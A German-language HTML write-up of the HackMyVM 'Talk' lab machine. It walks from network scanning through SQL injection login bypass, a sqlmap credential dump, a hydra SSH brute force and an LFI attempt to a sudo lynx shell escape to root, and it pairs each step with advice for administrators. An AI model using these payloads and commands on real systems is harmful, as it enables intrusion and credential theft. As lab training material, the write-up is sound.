@@ -1,0 +1,515 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Talk - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Talk - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">lynx</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80)</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (SQL Injection)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH Login)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Sudo Lynx)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Root Shell)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment durch Senden von ARP-Anfragen zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP-Adresse 192.168.2.138 und der MAC-Adresse 08:00:27:ca:9e:cc (PCS Systemtechnik GmbH / Oracle VirtualBox) wurde erfolgreich als Ziel identifiziert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die IP-Adresse des Ziels ist bekannt. Der nächste logische Schritt ist ein Port-Scan, um offene Dienste zu ermitteln.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung und ggf. Segmentierung, um die Erkennung von Hosts zu erschweren und laterale Bewegungen zu begrenzen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:00:00:00:00:af, IPv4: 192.168.2.129
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.138	08:00:27:ca:9e:cc	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.881 seconds (136.10 hosts/sec). 2 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf das Ziel 192.168.2.138 angewendet, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln. Optionen: `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-T5` (schnelles Timing), `-A` (umfassender Scan: OS, Version, Skripte, Traceroute), `-p-` (alle TCP-Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert drei offene TCP-Ports:
+                *   **22 (SSH):** OpenSSH 7.9p1 auf Debian 10. Ein Standard-Zugangspunkt.
+                *   **80 (HTTP):** Nginx 1.14.2. Hier läuft die primäre Webanwendung.
+                *   **6660 (Unknown):** Ein unbekannter Dienst. Das Nmap-Skript (`-sC`) konnte eine interessante Nachricht extrahieren, die an `www-data` gerichtet ist und von einem "Paul" unterzeichnet wurde. Diese Nachricht enthält einen Hinweis ("reward in my house"), der möglicherweise auf versteckte Informationen oder Credentials im Home-Verzeichnis des Benutzers `paul` hindeutet.
+                Die Betriebssystemerkennung deutet auf Debian 10 hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Webanwendung auf Port 80 ist das Hauptziel. Untersuchen Sie diese mittels Directory Brute-Forcing und auf Schwachstellen. Der Dienst auf Port 6660 sollte ebenfalls untersucht werden (z.B. mit `nc`), obwohl er möglicherweise nur eine statische Nachricht anzeigt. Der Benutzername `paul` ist ein wichtiger Hinweis für spätere Brute-Force-Versuche oder die Suche nach dessen Home-Verzeichnis.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie alle Dienste (SSH, Nginx) aktuell. Schließen Sie nicht benötigte Ports wie 6660 oder sichern Sie den darauf laufenden Dienst ab, um Informationslecks zu vermeiden. Überprüfen Sie die Konfiguration des Dienstes auf Port 6660.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.138 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 15:00 CEST
+Nmap scan report for talk.vm (192.168.2.138)
+Host is up (0.00016s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 8d:3a:8e:5e:8c:e0:3e:1c:ac:7b:a8:4d:1b:09:98:4f (RSA)
+|   256 5f:60:09:81:33:a5:74:46:11:1e:22:84:3f:7a:7e:f6 (ECDSA)
+|_  256 6f:98:92:2f:ec:34:59:41:ea:8a:40:bc:cadc:60:5b (ED25519)
+80/tcp   open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Talk - Home Page
+6660/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines, NULL:
+|     MESSAGE FOR WWW-DATA:
+|          www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
+|_    Paul
+MAC Address: 08:00:27:CA:9E:CC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4
+OS details: Linux 4.19
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms talk.vm (192.168.2.138)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.19 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Port 80)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster wird eingesetzt, um Verzeichnisse und Dateien auf dem Webserver (Port 80) zu entdecken. Es werden eine Standard-Wortliste und gängige Dateierweiterungen verwendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert mehrere PHP-Dateien und Verzeichnisse:
+                *   `/index.php`: Hauptseite.
+                *   `/login.php`, `/register.php`, `/profile.php`, `/home.php`, `/logout.php`: Typische Seiten einer Webanwendung mit Benutzerverwaltung.
+                *   `/img/`, `/css/`, `/js/`, `/db/`: Verzeichnisse für Ressourcen. Das `/db/`-Verzeichnis könnte interessant sein.
+                *   `/conn.php`: Eine Datei, die wahrscheinlich Code für die Datenbankverbindung enthält.
+                Einige Seiten (`home.php`, `profile.php`, `logout.php`) leiten auf `index.php` weiter, was typisch ist, wenn der Benutzer nicht authentifiziert ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche `/login.php` und `/register.php` auf Schwachstellen (SQL Injection, XSS, schwache Passwörter). Versuche, auf `/db/` und `/conn.php` zuzugreifen, um möglicherweise Datenbank-Credentials oder andere sensible Informationen zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf potenziell sensible Dateien wie `/conn.php` und Verzeichnisse wie `/db/`. Stellen Sie sicher, dass keine Credentials im Klartext im Code gespeichert sind. Deaktivieren Sie Directory Listing.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">gobuster dir -u http://192.168.2.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.138
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt
+[+] Expanded:                True
+[+] Timeout:                 10s
+===============================================================
+2023-04-16 15:05:01 Starting gobuster
+===============================================================
+http://192.168.2.138/index.php            (Status: 200) [Size: 2141]
+http://192.168.2.138/img                  (Status: 301) [Size: 162] [--> http://192.168.2.138/img/]
+http://192.168.2.138/home.php             (Status: 302) [Size: 0] [--> index.php]
+http://192.168.2.138/register.php         (Status: 200) [Size: 75]
+http://192.168.2.138/profile.php          (Status: 302) [Size: 0] [--> index.php]
+http://192.168.2.138/login.php            (Status: 200) [Size: 127]
+http://192.168.2.138/css                  (Status: 301) [Size: 162] [--> http://192.168.2.138/css/]
+http://192.168.2.138/db                   (Status: 301) [Size: 162] [--> http://192.168.2.138/db/]
+http://192.168.2.138/js                   (Status: 301) [Size: 162] [--> http://192.168.2.138/js/]
+http://192.168.2.138/logout.php           (Status: 302) [Size: 0] [--> index.php]
+http://192.168.2.138/conn.php             (Status: 200) [Size: 0] <!-- Leer oder geschützt? -->
+...
+===============================================================
+2023-04-16 15:10:15 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein weiterer Gobuster-Scan wird spezifisch auf das `/admin`-Verzeichnis durchgeführt, das im vorherigen Scan gefunden wurde. Das Ergebnis dieses Scans fehlt jedoch im bereitgestellten Text. Ebenso wird ein LFI-Versuch auf `config.php` erwähnt, aber weder Ergebnis noch der Fund von `config.php` sind im vorherigen Gobuster-Output dokumentiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Dokumentation ist hier lückenhaft. Der Inhalt oder das Ergebnis des Scans von `/admin` und des LFI-Versuchs fehlen. Wir können keine Schlussfolgerungen aus diesen Schritten ziehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie den Gobuster-Scan auf `/admin` erneut durch und dokumentieren Sie das Ergebnis. Testen Sie LFI sorgfältiger, z.B. auf andere Dateien und Parameter. Konzentrieren Sie sich auf die `login.php` und `register.php`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vollständige Dokumentation ist wichtig für nachvollziehbare Sicherheitstests. Schützen Sie das `/admin`-Verzeichnis und alle darin enthaltenen Dateien.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+# LFI Versuch (Ergebnis fehlt):
+http://192.168.2.132/config.php?file=../../../../etc/passwd
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.132/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+# (Gobuster Ausgabe für /admin fehlt im Report)
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="vulnerability-analysis">
+             <h2>Vulnerability Analysis (SQL Injection)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `wfuzz` wird verwendet, um gezielt nach SQL-Injection-Schwachstellen im `username`-Parameter der `login.php` zu suchen. Es wird eine Wortliste mit SQLi-Payloads (`sqlinjections.txt`) verwendet. Die POST-Daten enthalten `username=FUZZ` und `password=#`. Antworten mit 127 Zeichen (vermutlich die Fehlerseite) werden ausgeblendet (`--hh 127`). Erfolgreiche Injections führen zu einem HTTP 302 Redirect (Size 0).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der `wfuzz`-Scan ist erfolgreich und identifiziert mehrere SQLi-Payloads, die die Authentifizierung umgehen können (z.B. `' or 1=1--`, `admin'--`, `' or 0=0 #`). Dies bestätigt eine SQL-Injection-Schwachstelle im `username`-Parameter. Ein manueller Test mit `' or 1=1--` führt zur `home.php` und listet Benutzernamen auf (`tina`, `jerry`, `nona`, `Pao`).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die bestätigte SQLi-Schwachstelle mit `sqlmap`, um die Datenbankstruktur zu untersuchen und sensible Daten wie Benutzer-Credentials zu extrahieren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die SQL-Injection-Schwachstelle dringend durch die Verwendung von Prepared Statements oder einer strikten Eingabevalidierung und -sanitisierung für alle Benutzereingaben, insbesondere in Login-Formularen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/wordlists/sqlinjections.txt -u http://192.168.2.138/login.php -d "username=FUZZ&password=#" -t 100 -Z --hh 127</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.138/login.php
+Data: username=FUZZ&password=#
+Total requests: 126
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000019:   302        0 L      0 W        0 Ch        "admin'--"
+000000006:   302        0 L      0 W        0 Ch        "'%20--"
+000000039:   302        0 L      0 W        0 Ch        "' or 1=1 or ''='"
+000000034:   302        0 L      0 W        0 Ch        "' or '1'='1'--"
+000000032:   302        0 L      0 W        0 Ch        "' or 1=1--"
+000000029:   302        0 L      0 W        0 Ch        "' or 0=0 #"
+000000026:   302        0 L      0 W        0 Ch        "' or 0=0 --"
+000000047:   302        0 L      0 W        0 Ch        "hi' or 1=1 --"
+000000121:   302        0 L      0 W        0 Ch        "x' or 1=1 or 'x'='y"
+000000119:   302        0 L      0 W        0 Ch        "' or 1=1 or ''='"
+
+Total time: 1.567194
+Processed Requests: 126
+Filtered Requests: 116
+Requests/sec.: 80.40009
+                    </pre>
+                     <pre>
+# Manueller Test mit Injection im Browser/Tool:
+# Username: ' or 1=1--
+# Password: (beliebig)
+# Ergebnis: Redirect zu http://192.168.2.138/home.php, Anzeige der Benutzernamen: tina, jerry, nona, Pao
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `sqlmap` wird mit einer gespeicherten HTTP-Request-Datei (`talk.sql`, Inhalt nicht gezeigt, enthält aber vermutlich einen POST-Request zur `login.php` mit dem injizierbaren Parameter) verwendet, um die Datenbank weiter zu untersuchen.
+                *   `--batch`: Führt Sqlmap ohne interaktive Nachfragen aus.
+                *   `--dbs`: Listet die verfügbaren Datenbanken auf.
+                *   `--level 3 --risk 3`: Erhöht die Intensität der Tests.
+                *   `--threads 10`: Verwendet 10 parallele Threads.
+                *   `-D chat --tables`: Listet die Tabellen in der Datenbank `chat` auf.
+                *   `-D chat -t user -C username,password --dump`: Extrahiert die Spalten `username` und `password` aus der Tabelle `user` in der Datenbank `chat`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `sqlmap` ist erfolgreich. Es identifiziert das Backend-DBMS als MySQL/MariaDB und findet die Datenbank `chat`. Innerhalb dieser Datenbank wird die Tabelle `user` gefunden. Schließlich werden die Benutzernamen und zugehörigen Klartext-Passwörter aus der Tabelle extrahiert:
+                *   pao: pao
+                *   nona: myfriendtom
+                *   tina: davidwhatpass
+                *   jerry: thatsmynonapass
+                *   david: adrianthebest
+                Die Speicherung von Passwörtern im Klartext ist eine gravierende Sicherheitslücke.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie die gefundenen Credentials für den SSH-Zugang (Port 22). Beginnen Sie mit dem Benutzer `nona`, da dessen Passwort `thatsmynonapass` aussagekräftiger erscheint als die anderen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die SQLi-Schwachstelle. **Speichern Sie Passwörter niemals im Klartext!** Implementieren Sie sicheres Passwort-Hashing (z.B. bcrypt, Argon2) mit Salt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r talk.sql --batch --dbs --level 3 --risk 3</span></div>
+                    <pre>
+# ... SQLMap Banner und Erkennung ...
+available databases [4]:
+[*] chat
+[*] information_schema
+[*] mysql
+[*] performance_schema
+# ... SQLMap Ende ...
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/talk.sql --threads 10 --batch -D chat --tables</span></div>
+                    <pre>
+# ... SQLMap Banner und Erkennung ...
+Database: chat
+[3 tables]
++-----------+
+| user      |
+| chat      |
+| chat_room |
++-----------+
+# ... SQLMap Ende ...
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/talk.sql --threads 10 --batch -D chat -t user -C username,password --dump</span></div>
+                    <pre>
+# ... SQLMap Banner und Erkennung ...
+Database: chat
+Table: user
+[5 entries]
++----------+-----------------------+
+| username | password              |
++----------+-----------------------+
+| pao      | pao                   |
+| nona     | <span class="password">myfriendtom</span>         |
+| tina     | <span class="password">davidwhatpass</span>       |
+| jerry    | <span class="password">thatsmynonapass</span>     |
+| david    | <span class="password">adrianthebest</span>       |
++----------+-----------------------+
+# ... SQLMap Ende ...
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+         <section id="initial-access">
+            <h2>Initial Access (SSH Login)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Hydra wird verwendet, um das Passwort für den SSH-Benutzer `nona` zu finden. Als Passwortliste wird `rockyou.txt` verwendet, in die zuvor die via SQLMap gefundenen Passwörter eingefügt wurden (laut Kommentar im Text). Die Option `-t64` fordert viele parallele Verbindungen an. `talk.vm` muss in `/etc/hosts` auf 192.168.2.138 zeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Hydra findet erfolgreich das Passwort `<span class="password">thatsmynonapass</span>` für den Benutzer `nona`. Dieses Passwort wurde zuvor durch SQLMap aus der Datenbank extrahiert. Der Brute-Force-Schritt bestätigt, dass dieses Passwort auch für den SSH-Login gültig ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Melden Sie sich per SSH mit den Credentials `nona` / `thatsmynonapass` an.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie keine identischen Passwörter für Datenbanken und System-Logins. Erzwingen Sie starke SSH-Passwörter oder bevorzugen Sie Key-basierte Authentifizierung. Implementieren Sie Schutzmechanismen gegen SSH-Brute-Force (z.B. fail2ban).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre># Annahme: /etc/hosts enthält "192.168.2.138    talk.vm"
+# Annahme: Passwörter aus SQLMap wurden zu /usr/share/wordlists/rockyou.txt hinzugefügt
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -t64 ssh://talk.vm -l nona -P /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-11 15:57:29
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344421 login tries (l:1/p:14344421), ~224132 tries per task
+[DATA] attacking ssh://talk.vm:22/
+[STATUS] 144132.00 tries/min, 144132 tries in 00:01h, 14200289 todo in 01:39h
+[22][ssh] host: talk.vm   login: nona   password: <span class="password">thatsmynonapass</span>
+[STATUS] attack finished successfully for ssh://talk.vm:22/ (1 found)
+1 of 1 completed in 00:01:15
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-11 15:58:44
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der SSH-Login als Benutzer `nona` mit dem zuvor gefundenen Passwort wird durchgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich. Initialer Zugriff als Benutzer `nona` wurde erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie grundlegende Enumeration durch: `id`, `pwd`, `ls -la`, `cat user.txt`, `sudo -l`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh nona@talk.vm</span></div>
+                    <pre>
+nona@talk.vm's password: <span class="password">thatsmynonapass</span> # Passwort eingegeben
+Linux talk 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Feb 18 03:32:20 2021 from 192.168.1.58
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">nona@talk:~$ <span class="command"></span></div> <!-- Nona's Prompt -->
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (Sudo Lynx)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `nona` wird die `user.txt`-Datei gelesen und die `sudo`-Berechtigungen überprüft.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das User-Flag (`wordsarelies`) wird gefunden. Die Ausgabe von `sudo -l` zeigt, dass `nona` den Befehl `/usr/bin/lynx` als jeder Benutzer (`ALL:ALL`) ohne Passwortabfrage (`NPASSWD`) ausführen darf. Da `lynx` ein interaktiver Browser ist, der oft eine Möglichkeit bietet, externe Befehle oder eine Shell auszuführen, ist dies ein direkter Weg zur Privilege Escalation zu `root`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie `sudo /usr/bin/lynx` aus und nutzen Sie die Shell-Escape-Funktion von `lynx` (oft durch Drücken von `!`), um eine Root-Shell zu erhalten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel für `lynx`. Konfigurieren Sie `sudo`-Rechte nach dem Prinzip der geringsten Rechte. Vermeiden Sie `NOPASSWD`, insbesondere für Programme, die Shell-Escapes ermöglichen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Befehle als nona -->
+                    <div class="prompt" style="color: #ffffff;">nona@talk:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">wordsarelies</span></pre>
+                    <div class="prompt" style="color: #ffffff;">nona@talk:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for nona on talk:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nona may run the following commands on talk:
+    (ALL : ALL) NOPASSWD: /usr/bin/lynx
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Root Shell)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Die `sudo`-Regel für `lynx` wird ausgenutzt. Der Befehl `sudo /usr/bin/lynx` wird ausgeführt. Innerhalb von `lynx` wird gewartet, bis die Option zum Fortfahren erscheint ("Press Space to next Page"), und dann `!` gedrückt, um eine Shell zu starten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Privilege Escalation ist erfolgreich. Das Drücken von `!` in `lynx` startet eine Shell mit den Rechten, mit denen `lynx` ausgeführt wurde – in diesem Fall `root`. Der Prompt ändert sich zu `root@talk:/home/nona#`. Die Root-Flag (`talktomeroot`) wird aus `/root/root.txt` gelesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht, beide Flags wurden gefunden. Dokumentieren Sie den Eskalationspfad über die `sudo`-Fehlkonfiguration.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die unsichere `sudo`-Regel wie zuvor empfohlen. Überprüfen Sie alle `sudo`-Regeln auf ähnliche Schwachstellen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Befehle als nona -->
+                     <div class="prompt" style="color: #ffffff;">nona@talk:~$ <span class="command">sudo /usr/bin/lynx</span></div>
+                    <pre>
+# (Lynx startet, Enter drücken bis "-- Press Space to next Page --" erscheint)
+# (Taste '!' drücken)
+Spawning your default shell.  Use 'exit' to return to Lynx.
+                    </pre>
+                    <!-- Root-Shell -->
+                    <div class="prompt" style="color: #ff0000;">root@talk:/home/nona# <span class="command">id</span></div>
+                    <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    <div class="prompt" style="color: #ff0000;">root@talk:/home/nona# <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">wordsarelies</span></pre>
+                    <div class="prompt" style="color: #ff0000;">root@talk:/home/nona# <span class="command">cat /root/root.txt</span></div>
+                    <pre><span class="password">talktomeroot</span></pre>
+                    <div class="prompt" style="color: #ff0000;">root@talk:/home/nona# <span class="command"></span></div><!-- Root Prompt -->
+                </div>
+            </div>
+        </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">wordsarelies</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">talktomeroot</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. Oktober 2022</p> <!-- Datum aus SQLMap/Hydra Kontext -->
+    </footer>
+</body>
+</html>
